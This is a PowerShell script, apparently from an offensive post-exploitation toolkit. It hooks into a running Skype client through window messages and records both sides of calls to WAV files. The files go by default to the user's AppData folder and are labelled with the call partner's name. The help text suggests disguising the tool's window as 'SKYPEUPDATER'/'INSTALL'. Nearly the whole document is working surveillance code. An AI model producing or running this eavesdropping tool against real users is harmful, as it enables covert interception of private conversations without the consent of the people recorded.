Function Start-SkypeRecorder
{
    <#
    .SYNOPSIS
    Audio recording of skype calls

    Author: Christopher Ross (@xorrior)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION
    This script provides the ability to record skype calls for a specified amount of time. The Skype API is accessible through the use of Window messages.
    An initial broadcast message is sent out to all window handles, with a request to connect to Skype afterwards. The user will be prompted to allow a third-party 
    application to connect to skype. If the user selects yes, messages from skype will be received for the specified duration or the Skype application is closed.
    Calls are recorded in two separate streams, one for the microphone and the other for speakers. The streams will be saved to wav files in the OutputDirectory.

    .PARAMETER WindowClassName
    The name to use for the WindowClass that will be created. Defaults to SkypeClass

    .PARAMETER WindowMenuName
    The name to use for the Window Menu. Defaults to SkypeMenu

    .PARAMETER Duration 
    The length of time in which the script will retrieve skype messages in minutes. The Duration value will be ignored in the timeout loop
    if there is a call currently being recorded. 

    .PARAMETER OutDirectory
    The directory in which both the microphone and speaker recorded streams will be saved. The file format will be as follows:
    speaker-TIMESTAMP-username.wav
    microphone-TIMESTAMP-username.wav
    If the username is not available then it will not be appended to the filename. 

    .PARAMETER MaxRetries
    In the case in which skype responds to a ALTER CALL message with ERROR, the number of times to resend the ALTER CALL message. 

    .PARAMETER ShowStatus
    SWITCH. When enabled, messages received from skype will be output to the pipeline.

    .EXAMPLE 
    Start-SkypeRecorder -Duration 20 -ShowStatus 

    Retrieve skype messages for 20 mins and also output the messages received. 

    .EXAMPLE
    Start-SkypeRecorder -Duration 20 -MaxRetries 3

    Retrieve skype messages for 20 mins and Resend the ALTER CALL message up to 3 times if the initial message receives an ERROR response.

    .EXAMPLE 
    Start-SkypeRecorder -WindowClassName "SKYPEUPDATER" -WindowMenuName "INSTALL" -Duration 10 -ShowStatus
    
    Retrieve skype messages for 10 mins and use the specified WindowClassName and WindowMenuName. Also output the messages received from skype.
    #>

    [CmdletBinding()]
    param
    (
        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [string]$WindowClassName,

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [string]$WindowMenuName,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [int]$Duration,

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [string]$OutDirectory,

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [int]$MaxRetries,

        [Switch]$ShowStatus
    )

    if (-not $PSBoundParameters['WindowClassName']) {
        $WindowClassName = "SkypeClass"
    }

    if (-not $PSBoundParameters['WindowMenuName']) {
        $WindowMenuName = "SkypeMenu"
    }

    if (-not $PSBoundParameters['OutDirectory']){
        $OutDirectory = $env:APPDATA
    }

    if (-not $PSBoundParameters['MaxRetries']) {
        $Script:MaxRetries = 1
    }
    else {
        $Script:MaxRetries = $MaxRetries
    }

    #Window Procedure
    $CustomWndProc = {

        param
        (
            [IntPtr]$hWnd,
            [Int32]$msg,
            [IntPtr]$wParam,
            [IntPtr]$lParam
        )


        Function Start-Recording
        {
            param
            (
                [string]$callID
            )
            $Script:recording = $False
            $speakerfilename = "speaker-$(Get-Date -Format o).wav"
            $micfilename = "microphone-$(Get-Date -Format o).wav"
            $GetDispName = "GET CALL $callID PARTNER_DISPNAME"
            #Get the PARTNER_DISPNAME property of the CALL object
            $responseStruct = [Activator]::CreateInstance([Type]$CopyDataStructType)
            $CopyDataStructSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$CopyDataStructType)
            $responseStruct.Id = $callID
            $responseStruct.Data = $GetDispName
            $responseStruct.Size = $GetDispName.Length + 1
            $responsePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($CopyDataStructSize)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($responseStruct,$responsePtr,$False)
            #Send the message
            $result = [IntPtr]::Zero
            $hWinHandle = New-Object System.Runtime.InteropServices.HandleRef -ArgumentList $null,$Script:SkypeHandle
            $Win32NativeMethods::SendMessageTimeout($hWinHandle,$WM_COPYDATA,$hWnd,$responsePtr,$SMTO_NORMAL,100,[ref]$result) | Out-Null

            if ($Script:user -ne $null) {
                $username = $Script:user
                $speakerfilename = "$($speakerfilename.Split('.')[0])-$username.wav"
                $micfilename = "$($micfilename.Split('.')[0])-$username.wav"
            }
            #filenames can't have semicolons
            $speakerfilename = $speakerfilename.Replace(':','.')
            $micfilename = $micfilename.Replace(':','.')
            $SetSpeakerOutput = "ALTER CALL $callID SET_OUTPUT FILE=`"$OutDirectory\$speakerfilename`""
            $SetMicrophoneOutput = "ALTER CALL $callID SET_CAPTURE_MIC FILE=`"$OutDirectory\$micfilename`""
            
            #Send message to skype to record current call.
            $responseStruct.Data = $SetSpeakerOutput
            $responseStruct.Size = $SetSpeakerOutput.Length + 1 
            $responsePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($CopyDataStructSize)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($responseStruct,$responsePtr,$False)
            #Send the message 
            $result = [IntPtr]::Zero
            $Win32NativeMethods::SendMessageTimeout($hWinHandle,$WM_COPYDATA,$hWnd,$responsePtr,$SMTO_NORMAL,100,[ref]$result) | Out-Null
            $Script:SkypeMessage = "Sent command: $SetSpeakerOutput"
            $responseStruct.Data = $SetMicrophoneOutput
            $responseStruct.Size = $SetMicrophoneOutput.Length + 1
            $responsePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($CopyDataStructSize)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($responseStruct,$responsePtr,$False)
            #Send the message
            $result = [IntPtr]::Zero
            $Win32NativeMethods::SendMessageTimeout($hWinHandle, $WM_COPYDATA, $hWnd,$responsePtr, $SMTO_NORMAL, 100, [ref]$result) | Out-Null
            $Script:SkypeMessage = "Sent command: $SetMicrophoneOutput"

        }
        $WM_COPYDATA = 74
        

        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}
        $Win32NativeMethods = $SystemAssembly.GetType('Microsoft.Win32.NativeMethods')
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        $SafeWin32Methods = $SystemAssembly.GetType('Microsoft.Win32.SafeNativeMethods')
        
        if ($msg -eq $Script:SkypeControlAPIAttach) {
            #Process the ApiDiscover msg
            switch ($lParam) {
                0 { #Success
                    $Script:SkypeHandle = $wParam
                    $Script:SkypeMessage = "Attach Success" 
                }
                1 { #PendingAuthorization
                    $Script:SkypeMessage = "Pending Authorization"
                }
                2 { #Refused 
                    $Script:SkypeMessage = "Attach Refused"
                }
                3 { #NotAvailable
                    $Script:SkypeMessage = "Attach Refused" 
                }
                0x8001 { #APIAvailable
                    $Global:NotAvailable = $False
                    $result = [IntPtr]::Zero
                    $msgresult = $Win32NativeMethods::SendMessageTimeout($Broadcast, 
                                                                         $Script:SkypeAPIDiscover, 
                                                                         $hWnd, 
                                                                         [IntPtr]::Zero, 
                                                                         $SMTO_NORMAL, 
                                                                         100, 
                                                                         [ref]$result) 
                    $Script:SkypeMessage = "API Available, sendmessage result: $msgresult and $result" 
                }
                default {$retVal = $UnsafeNativeMethods::DefWindowProc($hWnd, $msg, $wParam, $lParam)}
            }
            New-Object IntPtr 1
        }
        elseif ($msg -eq $Script:SkypeAPIDiscover) {
            $hWndOther = $wParam
            if ($hWndOther -ne $hWnd) {
                $Script:SkypeMessage = "Detected other skype api client"
            }
            New-Object IntPtr 1
        }
        elseif ($msg -eq $WM_COPYDATA) {
            
            $struct = [System.Runtime.InteropServices.Marshal]::PtrToStructure($lParam,[Type]$CopyDataStructType)
            
            if ($Script:SkypeHandle -ne $null) {
                #Handle the skype message
                
                $skypeStatus = $($struct.Data)
                $Script:SkypeMessage = "Msg from skype: $skypeStatus"
                if ($skypeStatus -match "CALL \d+ STATUS INPROGRESS") {
                    $Script:callID = $skypeStatus -replace '\D+(\d+)\D+','$1'
                    Start-Recording -callID $Script:callID
                }
                elseif ($skypeStatus -match "CALL \d+ PARTNER_DISPNAME ") { 
                    $Script:user = "$($skypeStatus.split(' ')[-2])-$($skypeStatus.split(' ')[-1])"
                }
                elseif ($skypeStatus -match "CALL \d+ STATUS FINISHED") {
                    $Script:recording = $False
                }
                elseif ($skypeStatus -match "ERROR \d+ ALTER CALL: unable to alter input/output") {
                    #if we are unable to record the call, Try again?
                    
                    if (($Script:recording -ne $True) -and ($Script:retry -lt $Script:MaxRetries))  {
                        Start-Recording -callID $Script:callID
                    }
                    $Script:retry += 1
                }
                elseif (($skypeStatus -match "CALL \d+ CAPTURE_MIC FILE") -or ($skypeStatus -match "CALL \d+ OUTPUT FILE")) {
                    #Set recording to true, just in case the timeout loop finishes and the call is still going.
                    $Script:recording = $True
                }

            
            }
            
            New-Object IntPtr 1
        }
        else {
            #Else just pass execution to the default window processor
            $retVal = $UnsafeNativeMethods::DefWindowProc($hWnd, $msg, $wParam, $lParam)
            New-Object IntPtr 1
        }
    }

    #Splat arguments for Get-ItemProperty check
    $skypeHKCU = @{
        Path = 'HKCU:\SOFTWARE\Skype\Phone'
        Name = 'SkypePath'
    }

    $skypeHKLM =  @{
        Path = 'HKLM:\SOFTWARE\Skype\Phone'
        Name = 'SkypePath'
    }
    #Check if skype is installed by checking for the skypePath property in the registry and then check if the Skype.exe process is running 
    Write-Verbose "Checking if skype is installed and running"
    if ((Get-ItemProperty @skypeHKCU).SkypePath -or (Get-ItemProperty @skypeHKLM).SkypePath) {
        $skype = Get-Process -Name "Skype"
        if ($skype.GetType().Name -eq 'Process') {
            Write-Verbose "Building necessary types"
            #Load the PresentationFramework. Get a reference to the System and Windows.Forms assemblies for needed functions
            $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}
            $WindowsBase = [System.Reflection.Assembly]::LoadWithPartialName('WindowsBase')
            $UnsafeNativeMethods = $WindowsBase.GetType('MS.Win32.UnsafeNativeMethods')
            $Win32NativeMethods = $SystemAssembly.GetType('Microsoft.Win32.NativeMethods')
            $UnsafeWin32Methods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
            $SafeWin32Methods = $SystemAssembly.GetType('Microsoft.Win32.SafeNativeMethods')
            $WndProcType = $WindowsBase.GetType('MS.Win32.NativeMethods+WndProc')

            #Create an Instance of the WNDCLASSEX struct type
            $WNDCLASSEXType = $WindowsBase.GetType('MS.Win32.NativeMethods+WNDCLASSEX_D')
            $WNDCLASSExStruct = [Activator]::CreateInstance([Type]$WNDCLASSEXType)

            #Get some preliminary values for the WNDCLASSEX struct
            $WindowStyle = [Int32]0x0002 -bor [Int32]0x0001
            $wndClassSize = [System.Runtime.InteropServices.Marshal]::sizeof($WNDCLASSExStruct)
            $hInstance = $UnsafeWin32Methods::GetModuleHandle($(Get-Process -Id $PID).MainModule.ModuleName)

            #Fill in the values for the struct
            $WNDCLASSEXType.GetField('cbSize').SetValue($WNDCLASSExStruct, $wndClassSize) | Out-Null
            $WNDCLASSEXType.GetField('style').SetValue($WNDCLASSExStruct, $WindowStyle) | Out-Null
            $WNDCLASSEXType.GetField('lpfnWndProc').SetValue($WNDCLASSExStruct, ($CustomWndProc -as $WndProcType)) | Out-Null
            $WNDCLASSEXType.GetField('cbClsExtra').SetValue($WNDCLASSExStruct, 0) | Out-Null
            $WNDCLASSEXType.GetField('cbWndExtra').SetValue($WNDCLASSExStruct, 0) | Out-Null
            $WNDCLASSEXType.GetField('hInstance').SetValue($WNDCLASSExStruct, $hInstance) | Out-Null
            $WNDCLASSEXType.GetField('hIcon').SetValue($WNDCLASSExStruct, [IntPtr]::Zero) | Out-Null
            $WNDCLASSEXType.GetField('hCursor').SetValue($WNDCLASSExStruct, [IntPtr]::Zero) | Out-Null
            $WNDCLASSEXType.GetField('hbrBackground').SetValue($WNDCLASSExStruct, [IntPtr]::Zero) | Out-Null
            $WNDCLASSEXType.GetField('lpszMenuName').SetValue($WNDCLASSExStruct, $WindowMenuName) | Out-Null
            $WNDCLASSEXType.GetField('lpszClassName').SetValue($WNDCLASSExStruct, $WindowClassName) | Out-Null
            $WNDCLASSEXType.GetField('hIconSm').SetValue($WNDCLASSExStruct, [IntPtr]::Zero) | Out-Null
            

            #Create the COPYDATASTRUCT type
            $Domain = [AppDomain]::CurrentDomain
            $DynAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
            $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('ModBuilder', $False)
            $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $TypeBuilder = $ModuleBuilder.DefineType('COPYDATASTRUCT', $Attributes, [System.ValueType], 12)
            $TypeBuilder.DefineField("Id",[string],'Public') | Out-Null
            $TypeBuilder.DefineField("Size", [Int32], 'Public') | Out-Null
            $TypeBuilder.DefineField("Data", [string], 'Public') | Out-Null
            $CopyDataStructType = $TypeBuilder.CreateType()
            
            
            #Register our custom class 
            $RegisterClassEx = $UnsafeNativeMethods.GetMethod('RegisterClassEx',[System.Reflection.BindingFlags]'NonPublic,Static')
            Write-Verbose "Registering Class"
            $Atom = $RegisterClassEx.Invoke($null,@($WNDCLASSExStruct))
            $LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if (($Atom -eq $null) -or ($Atom -eq 0)) {
                Write-Error $LastError
                break
            }

            $Script:SkypeAPIDiscover = $SafeWin32Methods::RegisterWindowMessage("SkypeControlAPIDiscover")
            $Script:SkypeControlAPIAttach = $SafeWin32Methods::RegisterWindowMessage("SkypeControlAPIAttach")

            #Create the Window. By default, CreateWindowEx calls our call back function. 
            #The callback function must return successful in order to receive a valid window handle
            #$HWND_MESSAGE = New-Object IntPtr -ArgumentList -3 
            $currentWindowHandle = (Get-Process -Id $PID).MainWindowHandle
            Write-Verbose "Creating the Window"
            $WS_EX_None = [uint32]0x0000
            $WS_OVERLAPPED = [uint32]0x0000
            $hWndParent = New-Object System.Runtime.InteropServices.HandleRef $null,$currentWindowHandle
            $hMenu = New-Object System.Runtime.InteropServices.HandleRef 
            $hInstance = New-Object System.Runtime.InteropServices.HandleRef 
            $pvParam = [IntPtr]::Zero

            $Script:WindowHandle = $UnsafeNativeMethods::CreateWindowEx($WS_EX_None, 
                                                                        $WindowClassName, 
                                                                        $WindowMenuName, 
                                                                        $WS_OVERLAPPED, 
                                                                        -1, 
                                                                        -1, 
                                                                        0, 
                                                                        0, 
                                                                        $hWndParent, 
                                                                        $hMenu, 
                                                                        $hInstance, 
                                                                        $pvParam)
            $LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
            

            if (($Script:WindowHandle -eq $null) -or ($Script:WindowHandle -eq 0)) {
                Write-Error $LastError
                break
            }
            else {
                #Send a SkypeControlAPIAttach message to Skype. 
                $HWND_BROADCAST = New-Object System.IntPtr -ArgumentList 0xffff
                $Broadcast = New-Object System.Runtime.InteropServices.HandleRef -ArgumentList $null,$HWND_BROADCAST
                $SMTO_NORMAL = 0x0000
                $result = [IntPtr]::Zero
                $msgresult = $Win32NativeMethods::SendMessageTimeout($Broadcast, 
                                                                     $Script:SkypeAPIDiscover, 
                                                                     $Script:WindowHandle, 
                                                                     [IntPtr]::Zero, 
                                                                     $SMTO_NORMAL, 
                                                                     100, 
                                                                     [ref]$result)
                
                if ($msgresult -eq 0) {
                    Write-Verbose "SendMessageTimeout to Skype failed with return value: $msgresult"
                    break
                }
                
                $LastValue = $Script:SkypeMessage
                Write-Verbose "Starting the Timeout loop"
                $msgStructType = $SystemAssembly.GetType('Microsoft.Win32.NativeMethods+MSG')
                $msgStruct = [Activator]::CreateInstance($msgStructType)
                $handleref = New-Object System.Runtime.InteropServices.HandleRef
                $WM_QUIT = 0x12
                #start the message loop
                $Timeout = New-TimeSpan -Minutes $Duration
                $sw = [diagnostics.stopwatch]::StartNew()
                while ($sw.elapsed -lt $Timeout -or ($Script:recording -eq $True)){
                    #While the loop is running, grab each message from the queue (if any) and send it to WndProc
                    $UnsafeWin32Methods::PeekMessage([ref]$msgStruct, $handleref, 0, 0, 1) | Out-Null
                    $UnsafeWin32Methods::TranslateMessage([ref]$msgStruct) | Out-Null
                    $UnsafeWin32Methods::DispatchMessage([ref]$msgStruct) | Out-Null 
                    
                    if ($msgStruct.message -eq $WM_QUIT) {
                        break
                    }
                    if ($ShowStatus -and (($Script:SkypeMessage -ne $null) -and ($Script:SkypeMessage -ne $LastValue))) {
                        $LastValue = $Script:SkypeMessage
                        $Script:SkypeMessage
                    }
                    
                }
                Write-Verbose "Destroying the window we created with handle: $($Script:WindowHandle)"
                $windowHandleRef = New-Object System.Runtime.InteropServices.HandleRef $null,$Script:WindowHandle
                $retVal = $UnsafeWin32Methods::DestroyWindow($windowHandleRef)
                $LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
                if ($retVal -ne 0) {
                    Write-Verbose "Unregistering the window class: $WindowClassName"
                    $hInstanceHandleRef = New-Object System.Runtime.InteropServices.HandleRef $null,$hInstance
                    $UnsafeWin32Methods::UnregisterClass($WindowClassName, $hInstanceHandleRef)
                }
                else {
                    Write-Error $LastError
                    break
                }

                Get-ChildItem -Path $OutDirectory -Filter "*.wav"
            }
            
        }
        else {
            Write-Verbose "Skype doesn't appear to be running"
        }
    }
    else {
        Write-Verbose "Skype doesn't appear to be installed"
    }
}